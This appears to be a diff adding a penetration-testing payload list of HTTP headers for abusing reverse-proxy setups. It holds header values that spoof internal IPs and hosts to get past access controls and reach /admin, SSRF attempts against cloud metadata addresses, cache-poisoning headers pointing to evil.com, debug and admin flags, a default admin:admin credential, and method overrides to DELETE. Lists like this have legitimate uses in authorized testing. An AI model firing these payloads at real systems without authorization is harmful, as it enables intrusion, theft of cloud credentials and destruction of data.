@@ -1,0 +1,59 @@
+# ============================================================
+# Reverse Proxy Misconfigurations — Header Abuse
+# ============================================================
+
+# ---- Internal Service Access via Headers ----
+X-Original-URL: /admin
+X-Rewrite-URL: /admin
+X-Custom-IP-Authorization: 127.0.0.1
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-Host: internal.target.com
+X-Forwarded-Proto: https
+X-Forwarded-Scheme: https
+X-Forwarded-Port: 8080
+X-Internal: true
+X-Backend-Server: localhost
+
+# ---- IP Restriction Bypass ----
+X-Forwarded-For: 10.0.0.1
+X-Forwarded-For: 172.16.0.1
+X-Forwarded-For: 192.168.0.1
+X-Forwarded-For: 127.0.0.1
+X-Forwarded-For: ::1
+Forwarded: for="[::1]"
+Forwarded: for=127.0.0.1
+
+# ---- Host Header Injection ----
+Host: localhost
+Host: 127.0.0.1
+Host: internal.target.com
+Host: backend.internal
+Host: admin.internal
+
+# ---- Hop-by-Hop Header Abuse ----
+Connection: close, X-Forwarded-For
+Transfer-Encoding: chunked
+# Remove headers that proxy uses for security decisions
+
+# ---- SSRF via Proxy Headers ----
+X-Forwarded-Host: 169.254.169.254
+X-Forwarded-Server: metadata.google.internal
+
+# ---- Cache Key Poisoning Headers ----
+X-Host: evil.com
+X-Forwarded-Host: evil.com
+# If these are unkeyed in cache → cache poisoning
+
+# ---- Debug / Admin Activation ----
+X-Debug: true
+X-Admin: true
+X-Internal-Request: 1
+X-Backend-IP: 127.0.0.1
+Authorization: Basic YWRtaW46YWRtaW4=
+X-Admin-Token: admin
+
+# ---- Method Override ----
+X-HTTP-Method-Override: DELETE
+X-HTTP-Method: DELETE
+X-Method-Override: DELETE
+_method=DELETE
